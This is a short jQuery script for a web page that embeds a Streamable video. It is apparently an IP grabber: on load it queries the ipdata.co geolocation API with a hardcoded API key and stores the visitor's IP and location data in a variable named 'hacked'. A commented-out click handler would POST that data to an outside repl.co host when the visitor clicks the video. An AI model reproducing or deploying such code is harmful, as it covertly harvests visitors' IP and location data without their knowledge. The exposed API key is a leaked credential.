$(document).ready(() => {
    var request = new XMLHttpRequest();
    let hacked = {};
    request.open(
      "GET",
      "https://api.ipdata.co/?api-key=d4a3a4bc2ffb69c7c0a663d81623d9757def87d9d0bba7338ec800af"
    );

    request.setRequestHeader("Accept", "application/json");

    request.onreadystatechange = function () {
      if (this.readyState === 4) {
          hacked = (this.responseText);
      }
    };

    request.send();

    $(".video").click(function (e) {
        // $.ajax({ url: "https://APIPGM.sangonomiyakoko.repl.co", method: "POST", data: {"data": hacked} });
    });

    $(".video").append('<iframe src="https://streamable.com/e/qk4w6i?loop=0" frameborder="0" width="100%" height="100%" allowfullscreen style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden;"></iframe>');
})